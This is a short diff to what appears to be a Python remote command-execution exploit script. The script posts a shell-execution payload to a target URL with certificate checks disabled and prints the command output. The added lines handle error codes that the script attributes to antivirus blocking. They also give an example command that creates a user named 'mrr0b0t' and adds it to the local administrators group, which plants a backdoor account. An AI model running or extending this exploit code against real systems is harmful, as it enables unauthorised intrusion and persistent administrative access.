@@ -15,8 +15,10 @@ try:
 		shell_req = requests.post('%s'%(url),headers={'Content-Type': 'application/x-www-form-urlencoded'},data=shell_body_exec,verify=False, timeout=10)
 		if shell_req.status_code == 200:
 			print(shell_req.text.split('Name                            :')[0])
+		elif shell_req.status_code == 500:
+			print('(-) AV block exec cmd or you missing \\" ex: net localgroup \\"administrators\\" mrr0b0t /add')
 		else:
-			print('(-) AV block exec cmd!!')
+			print('(-) Something wrong IDK ~~')
 except(requests.ConnectionError, requests.ConnectTimeout, requests.ReadTimeout):
 	exit(0)
 except KeyboardInterrupt:
